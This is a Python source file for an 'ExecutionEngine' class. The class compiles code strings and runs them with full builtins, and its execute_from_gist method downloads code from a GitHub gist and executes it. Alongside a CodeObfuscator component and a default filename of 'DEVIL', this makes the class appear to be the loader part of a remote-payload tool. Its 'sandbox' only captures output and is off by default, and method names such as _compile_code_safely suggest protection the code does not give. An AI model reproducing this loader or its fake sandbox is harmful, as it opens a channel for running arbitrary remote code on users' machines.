import sys
import io
import contextlib
import traceback
from types import CodeType, ModuleType
from typing import Optional, Dict, Any, Callable

class ExecutionEngine:
    def __init__(self):
        self._native_core = NativeCore()
        self._obfuscator = CodeObfuscator()
        self._network_handler = NetworkHandler()
        self._execution_context = {}
        self._sandbox_enabled = False
        self._output_buffer = io.StringIO()
        self._error_buffer = io.StringIO()
        
    def _prepare_execution_environment(self) -> Dict[str, Any]:
        env = {
            '__name__': '__main__',
            '__doc__': None,
            '__package__': None,
            '__loader__': None,
            '__spec__': None,
            '__builtins__': __builtins__,
        }
        
        env.update(self._execution_context)
        
        return env
    
    def _compile_code_safely(self, code: str, filename: str = '<dynamic>') -> Optional[CodeType]:
        try:
            code_obj = compile(code, filename, 'exec')
            return code_obj
        except SyntaxError as e:
            self._handle_compilation_error(e)
            return None
        except Exception as e:
            self._handle_compilation_error(e)
            return None
    
    def _handle_compilation_error(self, error: Exception):
        error_msg = f"Compilation error: {str(error)}\n"
        error_msg += traceback.format_exc()
        self._error_buffer.write(error_msg)
        print(error_msg)
    
    def _execute_code_object(self, code_obj: CodeType, env: Dict[str, Any]) -> bool:
        try:
            exec(code_obj, env)
            return True
        except Exception as e:
            self._handle_execution_error(e)
            return False
    
    def _handle_execution_error(self, error: Exception):
        error_msg = f"Execution error: {str(error)}\n"
        error_msg += traceback.format_exc()
        self._error_buffer.write(error_msg)
        print(error_msg)
    
    def execute_code_string(self, code: str, filename: str = 'DEVIL') -> bool:
        code_obj = self._compile_code_safely(code, filename)
        
        if code_obj is None:
            return False
        
        env = self._prepare_execution_environment()
        
        if self._sandbox_enabled:
            return self._execute_in_sandbox(code_obj, env)
        else:
            return self._execute_code_object(code_obj, env)
    
    def _execute_in_sandbox(self, code_obj: CodeType, env: Dict[str, Any]) -> bool:
        old_stdout = sys.stdout
        old_stderr = sys.stderr
        
        try:
            sys.stdout = self._output_buffer
            sys.stderr = self._error_buffer
            
            result = self._execute_code_object(code_obj, env)
            
            return result
        finally:
            sys.stdout = old_stdout
            sys.stderr = old_stderr
    
    def get_output(self) -> str:
        return self._output_buffer.getvalue()
    
    def get_errors(self) -> str:
        return self._error_buffer.getvalue()
    
    def clear_buffers(self):
        self._output_buffer = io.StringIO()
        self._error_buffer = io.StringIO()
    
    def set_execution_context(self, context: Dict[str, Any]):
        self._execution_context.update(context)
    
    def enable_sandbox(self, enabled: bool = True):
        self._sandbox_enabled = enabled
    
    def execute_from_gist(self, gist_hash: str) -> bool:
        if not self._network_handler.validate_gist_hash(gist_hash):
            print(f"Invalid gist hash: {gist_hash}")
            return False
        
        code = self._network_handler.fetch_file_from_gist(gist_hash)
        
        if code is None:
            print(f"Failed to fetch gist: {gist_hash}")
            return False
        
        return self.execute_code_string(code)
    
    def create_module_from_code(self, code: str, module_name: str) -> Optional[ModuleType]:
        code_obj = self._compile_code_safely(code, f'<{module_name}>')
        
        if code_obj is None:
            return None
        
        module = ModuleType(module_name)
        module.__dict__['__name__'] = module_name
        module.__dict__['__file__'] = f'<{module_name}>'
        
        try:
            exec(code_obj, module.__dict__)
            return module
        except Exception as e:
            self._handle_execution_error(e)
            return None